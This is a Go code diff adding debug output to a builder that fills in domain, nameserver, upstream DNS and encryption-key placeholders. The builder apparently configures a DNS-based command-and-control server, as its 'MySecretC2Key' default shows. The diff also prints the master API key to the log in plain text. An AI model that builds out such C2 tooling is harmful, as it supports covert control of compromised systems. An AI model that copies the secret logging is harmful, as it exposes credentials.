@@ -537,13 +537,27 @@ func (api *APIServer) buildDNSServer(req DNSServerBuildRequest, masterURL, apiKe
 	configStr := string(config)
 
 	// Debug: Show what we're looking for and replacing
+	fmt.Printf("[Builder] Replacing Domain with: %s\n", req.Domain)
+	fmt.Printf("[Builder] Replacing NS1 with: %s\n", req.NS1)
+	fmt.Printf("[Builder] Replacing NS2 with: %s\n", req.NS2)
 	fmt.Printf("[Builder] Replacing MasterServer with: %s\n", masterURL)
 	fmt.Printf("[Builder] Replacing MasterAPIKey with: %s\n", apiKey)
 	fmt.Printf("[Builder] Replacing MasterServerID with: %s\n", serverID)
 
+	// Count occurrences before replacement for debugging
+	domainCount := strings.Count(configStr, "Domain:        \"example.com\",")
+	fmt.Printf("[Builder] Found %d occurrences of Domain field to replace\n", domainCount)
+
 	configStr = strings.ReplaceAll(configStr, "Domain:        \"example.com\",", fmt.Sprintf("Domain:        \"%s\",", req.Domain))
 	configStr = strings.ReplaceAll(configStr, "NS1:           \"ns1.example.com\",", fmt.Sprintf("NS1:           \"%s\",", req.NS1))
 	configStr = strings.ReplaceAll(configStr, "NS2:           \"ns2.example.com\",", fmt.Sprintf("NS2:           \"%s\",", req.NS2))
+
+	// Verify Domain was replaced
+	if strings.Contains(configStr, "Domain:        \"example.com\",") {
+		fmt.Printf("[Builder] WARNING: Domain field still contains 'example.com' after replacement!\n")
+	} else {
+		fmt.Printf("[Builder] ✓ Domain field replaced successfully\n")
+	}
 	configStr = strings.ReplaceAll(configStr, "UpstreamDNS:   \"8.8.8.8:53\",", fmt.Sprintf("UpstreamDNS:   \"%s\",", req.UpstreamDNS))
 	configStr = strings.ReplaceAll(configStr, "EncryptionKey: \"MySecretC2Key123!@#DefaultChange\",", fmt.Sprintf("EncryptionKey: \"%s\",", req.EncryptionKey))
 	if req.ServerAddress != "" {
